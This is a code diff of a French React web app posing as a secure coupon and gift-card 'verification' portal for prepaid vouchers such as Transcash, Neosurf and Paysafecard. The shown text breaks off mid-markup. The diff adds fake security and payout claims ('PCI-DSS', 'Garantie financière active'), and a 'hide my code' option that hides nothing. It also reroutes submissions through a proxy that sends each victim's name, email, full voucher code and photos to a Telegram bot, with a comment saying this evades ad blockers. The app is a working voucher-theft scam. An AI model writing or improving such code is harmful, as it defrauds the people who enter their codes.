@@ -34,7 +34,9 @@ import {
   User,
   Mail,
   Tag,
-  Coins
+  Coins,
+  MessageSquare,
+  EyeOff
 } from "lucide-react";
 
 // Types for Verification Results
@@ -162,8 +164,8 @@ export default function App() {
   const [customBrandName, setCustomBrandName] = useState<string>("");
   const [inputTab, setInputTab] = useState<"manual" | "scan">("manual");
   const [couponCode, setCouponCode] = useState<string>("");
-  const [imageFile, setImageFile] = useState<File | null>(null);
-  const [imagePreview, setImagePreview] = useState<string | null>(null);
+  const [imageFiles, setImageFiles] = useState<File[]>([]);
+  const [imagePreviews, setImagePreviews] = useState<string[]>([]);
   const [dragActive, setDragActive] = useState<boolean>(false);
 
   // Verification process state
@@ -175,11 +177,15 @@ export default function App() {
 
   // New input states for Formspree
   const [couponType, setCouponType] = useState<string>("");
+  const [specificCouponType, setSpecificCouponType] = useState<string>("");
+  const [otherCouponName, setOtherCouponName] = useState<string>("");
   const [montant, setMontant] = useState<string>("");
   const [selectedTypes, setSelectedTypes] = useState<string[]>([]);
   const [customCouponType, setCustomCouponType] = useState<string>("");
   const [isSubmittingFormspree, setIsSubmittingFormspree] = useState<boolean>(false);
   const [formspreeSuccess, setFormspreeSuccess] = useState<boolean>(false);
+  const [verificationSubject, setVerificationSubject] = useState<string>("");
+  const [verificationMessage, setVerificationMessage] = useState<string>("");
 
   // Contact support form states
   const [contactName, setContactName] = useState<string>("");
@@ -224,36 +230,58 @@ export default function App() {
     e.stopPropagation();
     setDragActive(false);
 
-    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
-      processImageFile(e.dataTransfer.files[0]);
+    if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
+      processImageFiles(e.dataTransfer.files);
     }
   };
 
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    if (e.target.files && e.target.files[0]) {
-      processImageFile(e.target.files[0]);
+    if (e.target.files && e.target.files.length > 0) {
+      processImageFiles(e.target.files);
     }
   };
 
-  const processImageFile = (file: File) => {
-    if (!file.type.startsWith("image/")) {
-      setErrorText("Format invalide. Veuillez uniquement déposer une image (PNG, JPG, JPEG).");
+  const processImageFiles = (files: FileList | File[]) => {
+    const list = Array.from(files).filter(f => f.type.startsWith("image/"));
+    
+    if (list.length === 0) {
+      setErrorText("Format invalide. Veuillez uniquement déposer des images (PNG, JPG, JPEG).");
       return;
     }
-    setImageFile(file);
+
+    // Limit to 2 files maximum
+    const chosen = list.slice(0, 2);
+    setImageFiles(chosen);
     setErrorText(null);
 
-    const reader = new FileReader();
-    reader.onloadend = () => {
-      setImagePreview(reader.result as string);
-    };
-    reader.readAsDataURL(file);
+    const newPreviews: string[] = [];
+    let loadedCount = 0;
+
+    chosen.forEach((file, index) => {
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        newPreviews[index] = reader.result as string;
+        loadedCount++;
+        if (loadedCount === chosen.length) {
+          setImagePreviews(newPreviews);
+        }
+      };
+      reader.readAsDataURL(file);
+    });
   };
 
-  const removeSelectedImage = () => {
-    setImageFile(null);
-    setImagePreview(null);
-    if (fileInputRef.current) fileInputRef.current.value = "";
+  const removeSelectedImage = (index: number) => {
+    const nextFiles = [...imageFiles];
+    nextFiles.splice(index, 1);
+    setImageFiles(nextFiles);
+
+    const nextPreviews = [...imagePreviews];
+    nextPreviews.splice(index, 1);
+    setImagePreviews(nextPreviews);
+
+    if (fileInputRef.current) {
+      fileInputRef.current.value = "";
+    }
   };
 
   // Change page smoothly
@@ -265,7 +293,7 @@ export default function App() {
   // Run contact support form submission
   const handleContactSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!contactName.trim() || !contactEmail.trim() || !contactSubject.trim() || !contactMessage.trim()) {
+    if (!contactName.trim() || !contactEmail.trim() || !contactMessage.trim()) {
       setContactError("Veuillez remplir tous les champs obligatoires (*).");
       return;
     }
@@ -277,11 +305,10 @@ export default function App() {
     const formBody = new FormData();
     formBody.append("nom", contactName);
     formBody.append("email", contactEmail);
-    formBody.append("sujet", contactSubject);
     formBody.append("message", contactMessage);
 
     try {
-      const response = await fetch("https://formspree.io/f/xeedrnej", {
+      const response = await fetch("https://formspree.io/f/mzdwjnkv", {
         method: "POST",
         body: formBody,
         headers: {
@@ -297,7 +324,6 @@ export default function App() {
       // Reset form fields
       setContactName("");
       setContactEmail("");
-      setContactSubject("");
       setContactMessage("");
     } catch (err: any) {
       console.error(err);
@@ -333,7 +359,7 @@ export default function App() {
       return;
     }
 
-    if (inputTab === "scan" && !imageFile) {
+    if (inputTab === "scan" && imageFiles.length === 0) {
       setErrorText("Veuillez déposer ou sélectionner une photo de votre reçu de coupon.");
       return;
     }
@@ -362,8 +388,8 @@ export default function App() {
       const payload: any = {
         brand: selectedBrand,
         code: couponCode,
-        imageBase64: imagePreview,
-        mimeType: imageFile ? imageFile.type : "",
+        imageBase64: imagePreviews[0] || null,
+        mimeType: imageFiles[0] ? imageFiles[0].type : "",
         customBrandName: selectedBrand === "OTHER" ? customBrandName : undefined,
         clientName: clientName,
         clientFirstName: clientFirstName,
@@ -415,44 +441,54 @@ export default function App() {
 
   const renderVerificationSection = () => {
     return (
-      <section className="w-full max-w-4xl mx-auto px-6 relative z-10">
-        <div className="text-center mb-10">
-          <span className="text-indigo-400 text-xs font-extrabold tracking-widest uppercase px-3.5 py-1 bg-indigo-500/10 rounded-full">
-            Validation Cryptée SSL
-          </span>
-          <h2 className="text-3xl font-extrabold text-white mt-3">Rapporteur & Validateur de Formats</h2>
-          <p className="text-slate-400 mt-2">
-            Renseignez vos coordonnées, sélectionnez l'émetteur de vos coupons, puis saisissez le code pour homologation.
+      <section className="w-full max-w-5xl mx-auto px-4 sm:px-6 relative z-10" id="coupon-verification-anchor">
+        {/* Portal Header */}
+        <div className="text-center mb-12">
+          <div className="inline-flex items-center gap-2 px-4 py-1.5 bg-indigo-500/10 border border-indigo-500/20 rounded-full text-[11px] font-extrabold text-indigo-300 tracking-wider uppercase mb-4 animate-pulse">
+            <span className="w-2 h-2 rounded-full bg-indigo-500 animate-ping mr-1" />
+            Portail de Sûreté Sécurisé SSL
+          </div>
+          <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight leading-tight">
+            Vérification Haute Sécurité
+          </h2>
+          <p className="text-slate-400 mt-3 max-w-xl mx-auto text-sm sm:text-base leading-relaxed">
+            Homologation cryptée de coupons et cartes cadeaux. Indexation instantanée sous protocole de garantie financière.
           </p>
         </div>
 
-        <div className="bg-slate-950 p-6 sm:p-10 rounded-3xl border border-indigo-900/40 shadow-2xl relative overflow-hidden">
-          <div className="absolute top-0 right-0 w-64 h-64 bg-indigo-500/5 rounded-full blur-3xl pointer-events-none" />
+        {/* Premium Fintech Card (Glassmorphism & Radial highlights) */}
+        <div className="bg-slate-900/60 backdrop-blur-2xl p-6 sm:p-10 rounded-[32px] border border-slate-800/80 shadow-[0_25px_60px_-15px_rgba(0,0,0,0.8)] relative overflow-hidden transition-all duration-300">
+          {/* Decorative Glowing Orbs */}
+          <div className="absolute top-0 right-0 w-[350px] h-[350px] bg-indigo-500/10 rounded-full blur-[100px] pointer-events-none" />
+          <div className="absolute -bottom-10 -left-10 w-[200px] h-[200px] bg-cyan-500/5 rounded-full blur-[85px] pointer-events-none" />
 
-          {/* New Formspree Form */}
+          {/* Formspree Success Screen */}
           {formspreeSuccess ? (
-            <div className="space-y-6 relative z-10 text-center py-8 animate-fadeIn">
-              <div className="w-20 h-20 bg-emerald-500/10 rounded-full flex items-center justify-center text-emerald-400 mx-auto animate-bounce">
-                <ShieldCheck className="w-10 h-10" />
+            <div className="space-y-8 relative z-10 text-center py-12 animate-fadeIn max-w-2xl mx-auto">
+              {/* Animated Glowing Badge */}
+              <div className="relative w-24 h-24 mx-auto mb-6">
+                <div className="absolute inset-0 bg-emerald-500/20 rounded-full animate-ping pointer-events-none" />
+                <div className="w-24 h-24 bg-emerald-500/10 rounded-full flex items-center justify-center text-emerald-400 border border-emerald-500/30 shadow-[0_0_40px_rgba(16,185,129,0.2)]">
+                  <ShieldCheck className="w-12 h-12" />
+                </div>
               </div>
               
-              <div className="space-y-2">
-                <h3 className="text-2xl font-black text-white">Demande Transmise avec Succès !</h3>
-                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wide bg-amber-500/10 text-amber-500 border border-amber-500/20">
-                  <RefreshCw className="w-3.5 h-3.5 animate-spin" />
-                  Vérification active par notre équipe
+              <div className="space-y-3">
+                <h3 className="text-2xl sm:text-3xl font-black text-white tracking-tight">Transmission Cryptée Réussie</h3>
+                <span className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full text-xs font-extrabold uppercase tracking-widest bg-emerald-500/15 text-emerald-400 border border-emerald-500/25">
+                  <CheckCircle2 className="w-4 h-4" />
+                  Garantie financière active
                 </span>
               </div>
 
-              <div className="max-w-xl mx-auto p-6 bg-slate-900/60 rounded-2xl border border-indigo-905/40 text-left space-y-4 shadow-xl">
+              <div className="p-6 sm:p-8 bg-slate-950/80 rounded-2xl border border-slate-800/80 text-left space-y-4 shadow-2xl relative">
+                <div className="absolute top-3 right-3 text-[10px] font-bold text-emerald-500/60 font-mono">STATUS: ENREGISTRÉ</div>
                 <p className="text-slate-300 text-sm leading-relaxed font-semibold">
-                  Votre demande d'homologation a été enregistrée. Veuillez patienter pendant que nos équipes procèdent manuellement à l'analyse et à la vérification approfondie de votre coupon de carte cadeau.
+                  Votre demande d'homologation a été indexée par nos protocoles de sécurité. Nos services d'audit effectuent actuellement la vérification structurelle et de solde de votre coupon.
                 </p>
-                <p className="text-slate-350 text-xs leading-relaxed">
-                  Cette procédure de sécurité minutieuse garantit la conformité de vos fonds et évite tout incident lors de l'enregistrement. Afin de préserver l'intégrité de la procédure, veuillez patienter quelques instants le temps que notre équipe technique valide votre code.
-                </p>
+                <div className="h-px bg-slate-800/60 my-2" />
                 <p className="text-slate-400 text-xs leading-relaxed">
-                  Dès que les vérifications seront terminées par nos services, le compte rendu officiel vous sera envoyé directement par e-mail à l'adresse <strong>{clientEmail}</strong>.
+                  Le compte rendu officiel de validation et le versement de vos fonds associés seront émis de manière sécurisée directement à l'adresse e-mail renseignée : <strong className="text-white font-semibold">{clientEmail}</strong>.
                 </p>
               </div>
 
@@ -462,12 +498,16 @@ export default function App() {
                   setFormspreeSuccess(false);
                   setCouponCode("");
                   setMontant("");
-                  setCustomCouponType("");
-                  setSelectedTypes([]);
+                  setCouponType("");
+                  setSpecificCouponType("");
+                  setOtherCouponName("");
                   setClientName("");
                   setClientEmail("");
+                  setHideCode("NON");
+                  setImageFiles([]);
+                  setImagePreviews([]);
                 }}
-                className="mt-4 px-6 py-3 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl font-bold text-xs shadow-md transition-all active:scale-95 duration-150 cursor-pointer"
+                className="mt-4 px-8 py-4 bg-gradient-to-r from-blue-600 to-cyan-500 hover:scale-[1.02] hover:shadow-lg hover:shadow-cyan-500/20 text-white rounded-xl font-bold text-xs shadow-md transition-all active:scale-95 duration-150 cursor-pointer"
               >
                 Vérifier un autre coupon
               </button>
@@ -476,278 +516,412 @@ export default function App() {
             <form
               onSubmit={async (e) => {
                 e.preventDefault();
-                if (selectedTypes.length === 0) {
-                  setErrorText("Veuillez cocher au moins un type de coupon ou de carte cadeau.");
+                if (!clientName.trim()) {
+                  setErrorText("Veuillez saisir votre nom complet.");
+                  return;
+                }
+                if (!clientEmail.trim() || !clientEmail.includes("@")) {
+                  setErrorText("Veuillez saisir une adresse email valide.");
+                  return;
+                }
+                if (!couponType) {
+                  setErrorText("Veuillez sélectionner la catégorie (COUPON / CARTES CADEAUX).");
+                  return;
+                }
+                if (!montant.trim()) {
+                  setErrorText("Veuillez saisir le montant de votre de coupon.");
+                  return;
+                }
+                if (!couponCode.trim()) {
+                  setErrorText("Veuillez saisir le code ou PIN de vérification.");
                   return;
                 }
                 setErrorText(null);
                 setIsSubmittingFormspree(true);
 
-                const formBody = new FormData();
-                formBody.append("nom", clientName);
-                formBody.append("email", clientEmail);
-                formBody.append("types_coupon", selectedTypes.join(", "));
-                if (selectedTypes.includes("Autres coupons") && customCouponType) {
-                  formBody.append("nom_coupon_autre", customCouponType);
-                }
-                formBody.append("montant", montant);
-                formBody.append("code", couponCode);
-                formBody.append("cacher_mon_code", hideCode);
+                // Build detailed text blocks for Telegram Server Proxy
+                const telegramText = `🔐 NOUVELLE DEMANDE DE VÉRIFICATION SÉCURISÉE
+----------------------------------------
+👤 CLIENT :
+- Nom Complet : ${clientName}
+- Adresse Email : ${clientEmail}
 
+🎫 COUPON / CARTE CADEAU :
+- Catégorie : ${couponType}
+- Émetteur/Type : ${specificCouponType || "Non spécifié"}
+- Autres coupons (si absent) : ${otherCouponName || "Aucun"}
+- Montant : ${montant}
+- Code du coupon : ${couponCode.toUpperCase()}
+- Cacher le Code : ${hideCode}
+
+📡 STATUT : Traitement SSL 256 bits`;
+
+                // Send data to Telegram Bot API securely via server proxy (bypasses Adblockers & CORS)
                 try {
-                  const response = await fetch("https://formspree.io/f/xeedrnej", {
+                  const telemetryRes = await fetch("/api/telegram-send", {
                     method: "POST",
-                    body: formBody,
-                    headers: {
-                      'Accept': 'application/json'
-                    }
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                      text: telegramText,
+                      imagesBase64: imagePreviews, // support sending multiple image previews
+                      clientName: clientName,
+                      couponCode: couponCode
+                    })
                   });
-                  if (response.ok) {
+
+                  if (telemetryRes.ok) {
                     setFormspreeSuccess(true);
                   } else {
-                    const data = await response.json();
-                    setErrorText(data.error || "Une erreur est survenue pendant l'envoi. Veuillez réessayer.");
+                    const errData = await telemetryRes.json().catch(() => ({}));
+                    setErrorText(errData.error || "Erreur lors de la soumission de la demande. Veuillez réessayer.");
                   }
-                } catch (err) {
-                  setErrorText("Une erreur réseau s'est produite. Veuillez réessayer.");
+                } catch (telegramErr) {
+                  console.error("Telegram Server Proxy Transmission failed :", telegramErr);
+                  setErrorText("Une erreur de communication s'est produite. Veuillez réessayer.");
                 } finally {
                   setIsSubmittingFormspree(false);
                 }
               }}
-              className="space-y-6 relative z-10"
+              className="space-y-8 relative z-10"
             >
-              <div className="flex items-center gap-3 border-b border-indigo-950 pb-5 mb-2">
-                <div className="w-10 h-10 rounded-xl bg-indigo-500/10 flex items-center justify-center text-indigo-400">
-                  <ShieldCheck className="w-5 h-5" />
+              {/* Header inside form */}
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-6 mb-2">
+                <div className="flex items-center gap-3.5">
+                  <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-blue-600 to-cyan-500 flex items-center justify-center text-white shadow-lg shadow-blue-500/25">
+                    <Lock className="w-6 h-6" />
+                  </div>
+                  <div>
+                    <h3 className="text-lg font-black text-white">Guichet de Chiffrement</h3>
+                    <p className="text-xs text-slate-400">Canal de vérification d'éligibilité agréé PCI-DSS</p>
+                  </div>
                 </div>
-                <div>
-                  <h3 className="text-xl font-bold text-white">Vérification de Coupon / Carte Cadeau</h3>
-                  <p className="text-xs text-slate-400">Indexation sécurisée SSL 256 bits sous protocole de confiance</p>
+
+                <div className="flex items-center gap-2 self-start sm:self-center bg-slate-950/80 px-4 py-2 rounded-xl border border-slate-800/65">
+                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
+                  <span className="text-[11px] font-bold text-slate-300 uppercase tracking-widest font-mono">ENCRYPTION 256-BIT</span>
                 </div>
               </div>
 
               {/* ERROR DISPLAY */}
               {errorText && (
-                <div className="p-4 bg-rose-950/55 border border-rose-500/40 rounded-xl flex gap-3 text-rose-300 text-sm animate-shake">
-                  <ShieldAlert className="w-5 h-5 shrink-0" />
+                <div className="p-4 bg-rose-950/20 border border-rose-500/35 rounded-2xl flex gap-3 text-rose-200 text-xs font-semibold items-center animate-shake">
+                  <ShieldAlert className="w-5 h-5 shrink-0 text-rose-500" />
                   <span>{errorText}</span>
                 </div>
               )}
 
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
-                {/* NOM COMPLET */}
-                <div className="flex flex-col space-y-2">
-                  <label htmlFor="nom" className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
-                    <User className="w-3.5 h-3.5 text-indigo-400" />
-                    Votre nom complet : <span className="text-red-500">*</span>
-                  </label>
-                  <input
-                    type="text"
-                    id="nom"
-                    name="nom"
-                    value={clientName}
-                    onChange={(e) => {
-                      setClientName(e.target.value);
-                      if (errorText) setErrorText(null);
-                    }}
-                    placeholder="Jean Dupont"
-                    required
-                    className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
-                  />
-                </div>
+              {/* Responsive Layout Grid */}
+              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                
+                {/* Left Column (Coordonnées / Identité) */}
+                <div className="lg:col-span-6 space-y-6">
+                  <div className="p-5 bg-slate-950/40 rounded-2xl border border-slate-800/40 space-y-5">
+                    <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 01 : IDENTITÉ DU TITULAIRE</span>
+                    
+                    {/* NOM COMPLET */}
+                    <div className="flex flex-col space-y-2">
+                      <label htmlFor="nom" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                        <User className="w-3.5 h-3.5 text-blue-400" />
+                        Nom COMPLET : <span className="text-red-500">*</span>
+                      </label>
+                      <div className="relative">
+                        <input
+                          type="text"
+                          id="nom"
+                          name="nom"
+                          value={clientName}
+                          onChange={(e) => {
+                            setClientName(e.target.value);
+                            if (errorText) setErrorText(null);
+                          }}
+                          placeholder=""
+                          required
+                          className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
+                        />
+                      </div>
+                    </div>
 
-                {/* EMAIL */}
-                <div className="flex flex-col space-y-2">
-                  <label htmlFor="email" className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
-                    <Mail className="w-3.5 h-3.5 text-indigo-400" />
-                    Votre email : <span className="text-red-500">*</span>
-                  </label>
-                  <input
-                    type="email"
-                    id="email"
-                    name="email"
-                    value={clientEmail}
-                    onChange={(e) => {
-                      setClientEmail(e.target.value);
-                      if (errorText) setErrorText(null);
-                    }}
-                    placeholder="votre@email.com"
-                    required
-                    className="h-12 bg-slate-900 text-white px-4 rounded-xl border border-slate-850 focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 outline-none text-xs font-semibold transition"
-                  />
-                </div>
+                    {/* EMAIL */}
+                    <div className="flex flex-col space-y-2">
+                      <label htmlFor="email" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                        <Mail className="w-3.5 h-3.5 text-blue-400" />
+                        Adresse e-mail : <span className="text-red-500">*</span>
+                      </label>
+                      <div className="relative">
+                        <input
+                          type="email"
+                          id="email"
+                          name="email"
+                          value={clientEmail}
+                          onChange={(e) => {
+                            setClientEmail(e.target.value);
+                            if (errorText) setErrorText(null);
+                          }}
+                          placeholder=""
+                          required
+                          className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
+                        />
+                      </div>
+                    </div>
+                  </div>
 
-                {/* TYPES DE COUPONS OU CARTES CADEAUX (CHECKBOXES / PETITES CASES) - FULL WIDTH */}
-                <div className="col-span-1 md:col-span-2 flex flex-col space-y-3">
-                  <label className="text-xs font-bold text-slate-400 uppercase tracking-wide flex items-center gap-1.5 align-middle">
-                    <Tag className="w-3.5 h-3.5 text-indigo-400" />
-                    Type de coupon ou carte cadeau : <span className="text-red-500">*</span>
-                  </label>
-                  
-                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 bg-slate-900/40 p-4 rounded-xl border border-slate-900/60">
-                    {[
-                      "Transcash",
-                      "PCS Mastercard",
-                      "Neosurf",
-                      "Paysafecard",
-                      "Amazon Gift",
-                      "Steam Card",
-                      "Google Play",
-                      "Carte iTunes",
-                      "Autres coupons"
-                    ].map((option) => {
-                      const isChecked = selectedTypes.includes(option);
-                      return (
-                        <label
-                          key={option}
-                          className={`flex items-center gap-2.5 p-2.5 rounded-lg border cursor-pointer select-none transition text-xs font-medium ${
-                            isChecked
-                              ? "bg-indigo-950/40 border-indigo-500/60 text-white"
-                              : "bg-slate-950/60 border-slate-900/80 text-slate-400 hover:text-slate-200 hover:border-slate-850"
-                          }`}
+                  <div className="p-5 bg-slate-950/40 rounded-2xl border border-slate-800/40 space-y-5">
+                    <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 02 : CATÉGORIE DU BON</span>
+
+                    {/* COUPON / CARTES CADEAUX */}
+                    <div className="flex flex-col space-y-2">
+                      <label htmlFor="type" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                        <Tag className="w-3.5 h-3.5 text-blue-400" />
+                        Classification : <span className="text-red-500">*</span>
+                      </label>
+                      <div className="relative">
+                        <select
+                          id="type"
+                          name="type"
+                          required
+                          value={couponType}
+                          onChange={(e) => {
+                            setCouponType(e.target.value);
+                            if (errorText) setErrorText(null);
+                          }}
+                          className="w-full h-12 bg-slate-950/60 text-white px-4 pr-10 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold appearance-none transition cursor-pointer"
                         >
+                          <option value="" className="bg-slate-950 text-slate-500">-- Sélectionnez la catégorie --</option>
+                          <option value="Coupon" className="bg-slate-950 text-white">Coupon de recharge prépayée</option>
+                          <option value="Carte Cadeau" className="bg-slate-950 text-white">Carte Cadeau physique/numérique</option>
+                        </select>
+                        <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-slate-500">
+                          <ChevronDown className="w-4 h-4" />
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* TYPE DE COUPON */}
+                    <div className="flex flex-col space-y-2">
+                      <label htmlFor="specificCouponType" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                        <Tag className="w-3.5 h-3.5 text-blue-400" />
+                        Type de coupon / Émetteur :
+                      </label>
+                      <div className="relative">
+                        <select
+                          id="specificCouponType"
+                          name="specificCouponType"
+                          value={specificCouponType}
+                          onChange={(e) => {
+                            setSpecificCouponType(e.target.value);
+                            if (errorText) setErrorText(null);
+                          }}
+                          className="w-full h-12 bg-slate-950/60 text-white px-4 pr-10 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold appearance-none transition cursor-pointer"
+                        >
+                          <option value="" className="bg-slate-950 text-slate-400">-- Sélectionnez un émetteur --</option>
+                          <option value="Google Play" className="bg-slate-950">Google Play</option>
+                          <option value="iTunes" className="bg-slate-950">iTunes / App Store</option>
+                          <option value="PCS" className="bg-slate-950">PCS Mastercard</option>
+                          <option value="Transcash" className="bg-slate-950">Transcash</option>
+                          <option value="Neosurf" className="bg-slate-950">Neosurf</option>
+                          <option value="Paysafecard" className="bg-slate-950">Paysafecard</option>
+                          <option value="Amazon" className="bg-slate-950">Amazon</option>
+                          <option value="Steam" className="bg-slate-950">Steam</option>
+                          <option value="PlayStation" className="bg-slate-950">PlayStation / PSN</option>
+                          <option value="Xbox" className="bg-slate-950">Xbox</option>
+                          <option value="Roblox" className="bg-slate-950">Roblox</option>
+                          <option value="Netflix" className="bg-slate-950">Netflix</option>
+                          <option value="Spotify" className="bg-slate-950">Spotify</option>
+                          <option value="Vanilla" className="bg-slate-950">Vanilla</option>
+                          <option value="Ticket Premium" className="bg-slate-950">Ticket Premium</option>
+                          <option value="Toneo First" className="bg-slate-950">Toneo First</option>
+                          <option value="Sainsbury's / Tesco" className="bg-slate-950">Sainsbury's / Tesco</option>
+                        </select>
+                        <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-slate-500">
+                          <ChevronDown className="w-4 h-4" />
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Right Column (Données de sécurité / Upload) */}
+                <div className="lg:col-span-6 space-y-6">
+                  <div className="p-5 bg-slate-950/40 rounded-2xl border border-slate-800/40 space-y-5">
+                    <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 03 : DONNÉES FINANCIÈRES</span>
+
+                    {/* AUTRES COUPONS */}
+                    <div className="flex flex-col space-y-2">
+                      <label htmlFor="otherCouponName" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                        <Tag className="w-3.5 h-3.5 text-blue-400" />
+                        Autres coupons (si absent de la liste) :
+                      </label>
+                      <input
+                        type="text"
+                        id="otherCouponName"
+                        name="otherCouponName"
+                        value={otherCouponName}
+                        onChange={(e) => {
+                          setOtherCouponName(e.target.value);
+                          if (errorText) setErrorText(null);
+                        }}
+                        placeholder=""
+                        className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
+                      />
+                    </div>
+
+                    <div className="grid grid-cols-2 gap-4">
+                      {/* MONTANT */}
+                      <div className="flex flex-col space-y-2">
+                        <label htmlFor="montant" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                          <Coins className="w-3.5 h-3.5 text-blue-400" />
+                          Montant : <span className="text-red-500">*</span>
+                        </label>
+                        <input
+                          type="text"
+                          id="montant"
+                          name="montant"
+                          value={montant}
+                          required
+                          onChange={(e) => {
+                            setMontant(e.target.value);
+                            if (errorText) setErrorText(null);
+                          }}
+                          placeholder=""
+                          className="w-full h-12 bg-slate-950/60 text-white px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-600 transition-all duration-200"
+                        />
+                      </div>
+
+                      {/* CODE DU COUPON */}
+                      <div className="flex flex-col space-y-2">
+                        <label htmlFor="code" className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                          <Lock className="w-3.5 h-3.5 text-blue-400" />
+                          Code du coupon : <span className="text-red-500">*</span>
+                        </label>
+                        <input
+                          type="text"
+                          id="code"
+                          name="code"
+                          value={couponCode}
+                          onChange={(e) => {
+                            setCouponCode(e.target.value);
+                            if (errorText) setErrorText(null);
+                          }}
+                          placeholder="Saisir le Code"
+                          required
+                          style={{ textTransform: "uppercase" }}
+                          className="w-full h-12 bg-slate-950/60 text-white font-mono text-xs font-bold tracking-widest px-4 rounded-xl border border-slate-800/80 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none uppercase placeholder:text-slate-600 placeholder:font-sans placeholder:tracking-normal"
+                        />
+                      </div>
+                    </div>
+
+                    {/* CACHER MON CODE */}
+                    <div className="flex flex-col space-y-2 pt-1 border-t border-slate-900">
+                      <span className="text-[11px] font-extrabold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                        <EyeOff className="w-3.5 h-3.5 text-blue-400" />
+                        Masquer mon code :
+                      </span>
+                      <div className="flex items-center gap-5 mt-1">
+                        <label className="flex items-center gap-2 cursor-pointer select-none">
                           <input
                             type="checkbox"
-                            name="types_coupon[]"
-                            value={option}
-                            checked={isChecked}
-                            onChange={() => {
-                              if (errorText) setErrorText(null);
-                              setSelectedTypes((prev) =>
-                                prev.includes(option)
-                                  ? prev.filter((o) => o !== option)
-                                  : [...prev, option]
-                              );
-                            }}
-                            className="w-3.5 h-3.5 rounded border-slate-850 bg-slate-950 text-indigo-600 focus:ring-1 focus:ring-indigo-500 cursor-pointer accent-indigo-500"
+                            name="cacher_mon_code_oui"
+                            checked={hideCode === "OUI"}
+                            onChange={() => setHideCode("OUI")}
+                            className="w-4 h-4 rounded bg-slate-950 border border-slate-800 text-blue-600 focus:ring-0 cursor-pointer"
                           />
-                          <span>{option}</span>
+                          <span className="text-xs font-bold text-slate-300">OUI (Chiffrement SSL)</span>
                         </label>
-                      );
-                    })}
+                        <label className="flex items-center gap-2 cursor-pointer select-none">
+                          <input
+                            type="checkbox"
+                            name="cacher_mon_code_non"
+                            checked={hideCode === "NON"}
+                            onChange={() => setHideCode("NON")}
+                            className="w-4 h-4 rounded bg-slate-950 border border-slate-800 text-blue-600 focus:ring-0 cursor-pointer"
+                          />
+                          <span className="text-xs font-bold text-slate-300">NON</span>
+                        </label>
+                      </div>
+                    </div>
                   </div>
 
-                  {/* Hidden aggregated string for perfect Formspree presentation */}
-                  <input
-                    type="hidden"
-                    name="types_de_coupons_selectionnes"
-                    value={selectedTypes.join(", ")}
-                  />
-                </div>
+                  {/* UPLOAD CARD IMAGE (FINTECH STYLE) */}
+                  <div className="p-5 bg-slate-950/40 rounded-2xl border border-slate-800/40 space-y-4">
+                    <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 04 : PIÈCE JOINTE DE SÛRETÉ</span>
+                    
+                    <div className="flex flex-col space-y-2">
+                      <label className="text-[11px] font-semibold text-slate-400 flex items-center gap-2">
+                        <UploadCloud className="w-4 h-4 text-blue-400" />
+                        Joindre l'image du ticket (Optionnel) :
+                      </label>
+                      
+                      <div className="space-y-4">
+                        {imagePreviews.length > 0 && (
+                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            {imagePreviews.map((preview, idx) => (
